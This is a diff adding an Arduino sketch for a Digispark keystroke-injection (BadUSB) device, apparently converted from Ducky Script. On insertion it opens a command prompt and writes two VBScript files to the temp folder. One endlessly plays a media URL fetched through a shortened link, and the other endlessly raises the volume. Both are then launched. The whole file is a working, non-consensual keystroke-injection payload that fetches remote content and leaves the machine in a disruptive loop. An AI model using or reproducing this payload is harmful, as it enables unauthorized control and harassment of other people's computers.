@@ -1,0 +1,62 @@
+// Converted using digiQuack by CedArctic (https://github.com/CedArctic/digiQuack) 
+
+#include "DigiKeyboard.h"
+
+void setup() {}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(3500);
+  DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT,KEY_R);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.print("cmd");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("del %tmp%\\rickyou.vbs");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.print("del %tmp%\\volup.vbs");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.print("cd %tmp% && copy con rickyou.vbs");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("While true");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("Dim oPlayer");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("Set oPlayer = CreateObject(\"WMPlayer.OCX\")");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("oPlayer.URL = \"http://tinyurl.com/s63ve48\"");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("oPlayer.controls.play");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("While oPlayer.playState <> 1 ' 1 = Stopped");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("WScript.Sleep 100");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("Wend");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("oPlayer.close");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("Wend");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,KEY_Z);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("copy con volup.vbs");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("do");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("Set WshShell = CreateObject(\"WScript.Shell\")");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("WshShell.SendKeys(chr(&hAF))");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("loop");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,KEY_Z);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("start rickyou.vbs && volup.vbs");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("exit");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+}
